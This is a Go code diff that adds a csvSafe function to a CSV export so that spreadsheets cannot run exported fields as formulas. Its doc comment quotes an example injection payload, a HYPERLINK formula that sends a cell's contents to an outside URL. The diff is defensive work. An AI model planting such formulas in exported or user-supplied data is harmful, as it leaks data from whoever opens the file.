@@ -6,6 +6,7 @@ import (
 	"encoding/csv"
 	"fmt"
 	"io"
+	"strings"
 
 	"github.com/nodarynet/nodary/internal/store"
 )
@@ -71,6 +72,9 @@ func ExportCSV(ctx context.Context, db *store.DB, f Filter, w io.Writer) (int64,
 		if err != nil {
 			return err
 		}
+		for i, field := range row {
+			row[i] = csvSafe(field)
+		}
 		if err := cw.Write(row); err != nil {
 			return err
 		}
@@ -122,4 +126,34 @@ func (r Record) row() ([]string, error) {
 		return nil, fmt.Errorf("export has %d values for %d columns", len(row), len(columnNames))
 	}
 	return row, nil
+}
+
+// riskyCSVPrefix are the characters a spreadsheet reads as the start of a
+// formula rather than as text.
+const riskyCSVPrefix = "=+-@\t\r"
+
+// csvSafe stops a spreadsheet executing an exported field.
+//
+// Excel, LibreOffice and Sheets strip the CSV quoting and then evaluate any
+// cell whose first character is one of these, so a justification of
+// `=HYPERLINK("http://…"&A1,"click")` — free text an operator types, and the
+// field most likely to be hostile in an audit log — runs when an auditor opens
+// the file (CWE-1236). Quoting does not help; only the cell's first character
+// matters.
+//
+// This deliberately alters the exported bytes, and the trade is worth naming.
+// CSV exists here because a spreadsheet opens it — that is its whole purpose
+// and therefore its whole attack surface. The record itself is untouched, its
+// hash is unaffected, and `--format jsonl` is the byte-faithful export that a
+// verifier reads. So fidelity is preserved where fidelity is the point, and
+// safety is added where safety is the point.
+//
+// The prefix is unambiguous on the way back: a leading apostrophe is only ever
+// added in front of one of these characters, so a reader strips it exactly when
+// the second character is one of them.
+func csvSafe(field string) string {
+	if field == "" || !strings.ContainsRune(riskyCSVPrefix, rune(field[0])) {
+		return field
+	}
+	return "'" + field
 }
